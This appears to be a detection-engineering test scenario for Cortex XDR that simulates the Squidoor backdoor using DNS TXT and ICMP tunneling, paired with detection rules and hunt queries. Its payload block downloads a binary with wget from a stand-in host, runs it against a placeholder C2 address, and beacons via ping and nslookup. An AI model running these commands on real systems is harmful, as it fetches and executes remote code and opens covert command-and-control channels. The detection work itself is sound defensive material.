identity.name: Squidoor Backdoor DNS and ICMP Tunneling via LOLBAS
identity.summary: A Linux host is compromised by the Squidoor backdoor which uses DNS TXT records and ICMP tunneling for C2 communication, leveraging LOLBAS binaries like nslookup and ping for execution. Cortex should
identity.description: A Linux host is compromised by the Squidoor backdoor which uses DNS TXT records and ICMP tunneling for C2 communication, leveraging LOLBAS binaries like nslookup and ping for execution. Cortex should detect the malicious process behavior and network activity.

techniques.name: Command and Scripting Interpreter: Unix Shell

payload.code:
wget -O /tmp/icmp_tunnel https://example.com/squidoor
chmod +x /tmp/icmp_tunnel
/tmp/icmp_tunnel --c2 192.0.2.10 --port 53 --protocol dns
ping -c 1 -W 1 -p 41424344 192.0.2.10
nslookup -type=txt 'beacon.squidoor.com' 192.0.2.10

expected_artifacts.description: DNS TXT query to C2 server

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Squidoor DNS TXT Beacon
biocs.description: Detection of nslookup process making TXT record queries to C2 IP
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'nslookup'
| filter action_file_path contains 'TXT'
| filter action_remote_ip = '192.0.2.10'

biocs.name: Squidoor ICMP Tunneling
biocs.description: Detection of ping command with custom payload to C2 IP
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'ping'
| filter action_file_path contains '-p 41424344'
| filter action_remote_ip = '192.0.2.10'

biocs.name: LOLBAS Execution
biocs.description: Detection of LOLBAS binaries used for execution
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ('nslookup', 'ping')
| filter action_remote_ip = '192.0.2.10'

xql_queries.name: DNS TXT Beacon Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter dst_ip = '192.0.2.10'
| filter dst_port = 53
| filter action_file_path contains 'TXT'
| filter actor_process_image_name = 'nslookup'

xql_queries.name: ICMP Tunneling Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_remote_ip = '192.0.2.10'
| filter action_file_path contains '-p 41424344'
| filter actor_process_image_name = 'ping'
